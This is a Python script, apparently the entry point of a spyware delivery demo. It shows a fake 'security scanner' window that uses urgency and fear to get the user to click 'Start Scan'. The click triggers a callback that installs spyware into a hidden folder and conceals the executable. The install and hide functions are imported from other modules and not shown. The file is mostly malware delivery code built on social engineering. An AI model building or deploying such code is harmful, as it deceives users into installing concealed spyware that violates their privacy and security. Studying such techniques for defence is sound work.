"""
DELIVERY TECHNIQUE 1: SOCIAL ENGINEERING
Fake "Security Scanner" that tricks user into installing spyware

This technique demonstrates:
- Professional-looking security software GUI
- Social engineering tactics (urgency, fear)
- User voluntarily executes the malware

Usage: python main.py (from this directory)
"""

import sys
import os

# Add parent directories to path
current_dir = os.path.dirname(os.path.abspath(__file__))
delivery_dir = os.path.dirname(current_dir)
malicious_dir = os.path.dirname(delivery_dir)
sys.path.insert(0, malicious_dir)

from delivery.technique1.function1_spyware_gui import show_spyware_gui
from delivery.technique2.function2_install_spyware import install_spyware
from delivery.technique2.function3_hide_spyware import hide_spyware

def execute_spyware_installation(user_email):
    """Callback when user clicks scan - installs spyware"""
    print("\n[Technique 1] User clicked scan button - installing spyware...")
    
    # Function 2: Install spyware to hidden folder
    install_spyware()
    
    # Function 3: Hide the spyware executable
    hide_spyware()
    
    print("[Technique 1] ✓ Spyware delivered successfully via social engineering!")

def main():
    print("="*70)
    print("DELIVERY TECHNIQUE 1: SOCIAL ENGINEERING (Fake Security Scanner)")
    print("="*70)
    print("\nThis technique demonstrates:")
    print("- Professional security software interface")
    print("- User voluntarily executes malicious code")
    print("- Social engineering: Trust exploitation")
    print("\nShowing fake security scanner GUI...")
    print("(User will click 'Start Scan' thinking it's legitimate)")
    print("="*70 + "\n")
    
    # Show GUI with callback
    window = show_spyware_gui(execute_spyware_installation)
    window.mainloop()
    
    print("\n[Technique 1] Demo complete - Spyware delivered via social engineering\n")

if __name__ == "__main__":
    main()

